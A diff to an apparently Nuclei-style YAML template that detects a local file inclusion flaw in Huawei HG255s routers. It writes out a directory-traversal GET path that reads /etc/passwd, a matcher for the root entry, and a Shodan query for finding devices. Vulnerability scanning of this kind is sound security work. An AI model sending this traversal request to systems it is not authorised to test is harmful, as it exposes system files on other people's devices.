@@ -1,5 +1,4 @@
 id: huawei-hg255s-lfi
-
 info:
   name: Huawei HG255s - Local File Inclusion
   author: 0x_Akoko
@@ -15,21 +14,19 @@ info:
     cpe: cpe:2.3:h:huawei:hg255s:*:*:*:*:*:*:*:*
   metadata:
     max-request: 1
+    product: hg255s
+    shodan-query: http.html:"HG532e"
     vendor: huawei
   tags: huawei,lfi,router,vuln
-
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/css/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd"
-
-    matchers-condition: and
-    matchers:
-      - type: regex
-        regex:
-          - "root:[x*]:0:0"
-
-      - type: status
-        status:
+  - matchers:
+      - regex:
+          - root:[x*]:0:0
+        type: regex
+      - status:
           - 200
-
+        type: status
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/css/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd'
